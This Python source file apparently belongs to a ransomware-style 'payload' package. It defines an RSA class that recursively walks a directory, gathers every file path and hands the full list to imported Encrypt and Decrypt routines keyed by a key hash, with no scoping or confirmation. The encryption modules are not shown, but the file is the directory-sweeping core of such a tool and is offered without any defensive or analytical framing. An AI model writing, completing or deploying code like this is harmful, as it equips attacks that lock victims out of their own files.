from payload.rsa.encrypt import Encrypt
from payload.rsa.decrypt import Decrypt
import os

class RSA:
    def __init__(self, key_hash):
        self.key_hash = key_hash
        self.all_files = []    
    def r_loop(self, dir_name): # recursively loop through a folder, adding each file and its complete path to an array
        files = os.listdir(dir_name)
        for f in files:
            if os.path.isdir(dir_name + "/" + f) == 1:
                new_dir = dir_name + "/" + f 
                self.r_loop(new_dir)
            else:
                self.all_files.append(dir_name + "/" + f)
    def encrypt(self, dir_name):
        self.r_loop(dir_name)
        Encrypt(
            self.all_files,
            self.key_hash
        )
    def decrypt(self, dir_name):
        self.r_loop(dir_name)
        Decrypt(
            self.all_files,
            self.key_hash
        )
